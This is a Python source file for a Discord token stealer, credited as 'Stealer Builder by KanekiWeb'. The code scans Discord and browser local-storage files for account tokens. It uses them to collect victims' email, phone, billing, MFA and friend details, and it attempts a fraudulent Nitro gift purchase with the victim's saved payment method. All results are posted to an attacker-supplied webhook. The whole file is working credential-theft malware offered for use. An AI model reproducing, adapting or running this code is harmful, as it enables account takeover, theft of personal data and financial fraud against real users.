# #  # # # # # # # # # # # # # # # # # # #
#  GITHUB.COM/Lawxsz                     #
#                                        #
#  Credits or at least one star :)       #
#                                        #
# #  # # # # # # # # # # # # # # # # # # #

import re, os, requests
import json

class Stealer():
    def __init__(self, webhook):
        self.hook = webhook
        self.tokens = []

    def GetTokens(self):
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"               : ROAMING + "\\Discord",
            "Discord Canary"        : ROAMING + "\\discordcanary",
            "Discord PTB"           : ROAMING + "\\discordptb",
            "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : ROAMING + "\\Lightcord",
            'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : LOCAL + "\\Amigo\\User Data",
            'Torch'                 : LOCAL + "\\Torch\\User Data",
            'Kometa'                : LOCAL + "\\Kometa\\User Data",
            'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
            'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
            '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
            'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
            'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
            'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
            'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
        }
        
        for platform, path in PATHS.items():
            path += "\\Local Storage\\leveldb"
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if token + " | " + platform not in self.tokens:
                                        self.tokens.append(token + " | " + platform)

    def getuserinfo(self, token):
        try:
            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
        except:return None
    
    def buy_nitro(self, token):
        try:
            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
            if r.status_code == 200:
                payment_source_id = r.json()[0]['id']
                if '"invalid": ture' in r.text:
                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
                    return r.json()['gift_code']
        except:return "None"
    
    def RareFriend(self, token):
        friends = ""
        try:
            req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()
            
            for user in req:
                badge = ""
                if user["user"]["public_flags"] == 1:badge = "Staff"
                elif user["user"]["public_flags"] == 2:badge = "Partner"
                elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
                elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
                elif user["user"]["public_flags"] == 512:badge = "Early"
                elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
                elif user["user"]["public_flags"] == 131072:badge = "Developer"
                else:badge = ""
                
                if badge != "":friends += badge + " | " + user['id'] + "\n"            
            if friends == "":friends += "No Rare Friends"            
            return friends
        except:return "None, Except Error"
    
    def main(self):
        embeds = []
        for token_line in self.tokens:
            try:
                token = token_line.split(" | ")[0]
                plateform = token_line.split(" | ")[1]
                languages = {'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}
                get_infos = self.getuserinfo(token)
                username = get_infos["username"] + "#" + get_infos["discriminator"]
                user_id = get_infos["id"]
                user_avatar = get_infos["avatar"]
                try:user_banner = get_infos["banner"]
                except:user_banner = None
                email = get_infos["email"] or "❌"
                phone = get_infos["phone"] or "❌"
                local = languages.get(get_infos["locale"])
                bio = get_infos["bio"] or "❌"
                mmfa = get_infos["mfa_enabled"]
                bbilling = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
                if bbilling == True:billing = "✔️"
                else:billing = "❌"                
                if mmfa == True:mfa = "✔️"
                else:mfa = "❌"
                badges = ""
                flags = get_infos['flags']
                if (flags == 1):badges += "Staff, "
                if (flags == 2):badges += "Partner, "
                if (flags == 4):badges += "Hypesquad Event, "
                if (flags == 8):badges += "Green Bughunter, "
                if (flags == 64):badges += "Hypesquad Bravery, "
                if (flags == 128):badges += "HypeSquad Brillance, "
                if (flags == 256):badges += "HypeSquad Balance, "
                if (flags == 512):badges += "Early Supporter, "
                if (flags == 16384):badges += "Gold BugHunter, "
                if (flags == 131072):badges += "Verified Bot Developer, "
                if (badges == ""):badges = "❌"                
                try:
                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
                    else:nitro_type = "❌ No Nitro"
                except:nitro_type = "❌ No Nitro"
                nnitro_buyed = self.buy_nitro(token)
                if nnitro_buyed == None:nitro_buyed = "❌"
                else:nitro_buyed = "✔️ discord.gift/" + nnitro_buyed            
                embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "**__User Infos:__**",
                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n- __Badges:__ `{badges}`\n- __Billing:__ `{billing}`\n- __A2F Enable:__ `{mfa}`"
                        },
                        {
                            "name": "__**About:**__",
                            "value": f"```{bio}```"
                        },
                        {
                            "name": "__**Token:**__",
                            "value": f"Plateform: **{plateform}**\n```\n{token}\n```"
                        },
                        {
                            "name": "__**Nitro Buy:**__",
                            "value": f"`{nitro_buyed}`"
                        },
                        {
                            "name": "__**Rare Friends:**__",
                            "value": f"```{self.RareFriend(token)}```"
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                    },
                    "footer": {
                        "text": f"Stealer Builder by KanekiWeb  -  kanekiweb.tk",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                    },
                    "image": {
                        "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
                    },
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}?size=1024"
                    }
                }
                embeds.append(embed)                
            except:pass        
        requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Stealer Builder","avatar_url": "https://cdn.discordapp.com/avatars/922450497074495539/a_c1738e5280f6e70487ef02d307c62a07?size=1024"}).encode())
        
Grabber = Stealer("U WEBHOOK URL")
Grabber.GetTokens()
Grabber.main()